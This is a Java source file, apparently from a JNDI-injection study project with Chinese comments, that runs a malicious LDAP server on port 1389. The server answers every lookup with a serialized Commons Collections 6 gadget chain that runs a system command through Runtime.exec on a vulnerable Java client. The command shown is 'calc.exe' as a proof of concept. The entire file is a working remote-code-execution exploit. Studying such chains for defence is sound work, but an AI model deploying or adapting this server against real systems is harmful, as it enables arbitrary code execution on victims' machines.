package JDNI_high;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

public class LDAPServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] args) {
        try {
            int port = 1389;

            // 创建LDAP服务器配置
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            // 添加操作拦截器
            config.addInMemoryOperationInterceptor(new OperationInterceptor());

            // 启动LDAP服务器
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("LDAP服务器启动在端口 " + port);
            System.out.println("LDAP URL: ldap://127.0.0.1:" + port + "/" + LDAP_BASE);
            ds.startListening();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }

        private void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
            // 生成包含CC6链的序列化对象
            byte[] payload = generateCC6Payload();

            // 设置LDAP条目的属性，包含序列化的对象
            e.addAttribute("javaClassName", "java.lang.String"); // 这里设置为一个合法类，但实际上会被我们的恶意代码替换
            e.addAttribute("javaSerializedData", payload);

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

        private byte[] generateCC6Payload() throws Exception {
            System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");

            // 创建CC6链
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
            };

            // 首先使用一个无害的转换器，稍后再替换为有害的
            Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
            Transformer transformerChain = new ChainedTransformer(fakeTransformers);

            Map innerMap = new HashMap();
            Map outerMap = LazyMap.decorate(innerMap, transformerChain);

            TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "key");
            Map hashMap = new HashMap();
            hashMap.put(tiedMapEntry, "value");
            outerMap.remove("key");

            // 使用反射替换为恶意转换器
            Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
            f.setAccessible(true);
            f.set(transformerChain, transformers);

            // 序列化对象
            ByteArrayOutputStream byteOut = new ByteArrayOutputStream();
            ObjectOutputStream objOut = new ObjectOutputStream(byteOut);
            objOut.writeObject(hashMap);
            objOut.close();

            return byteOut.toByteArray();
        }
    }
}
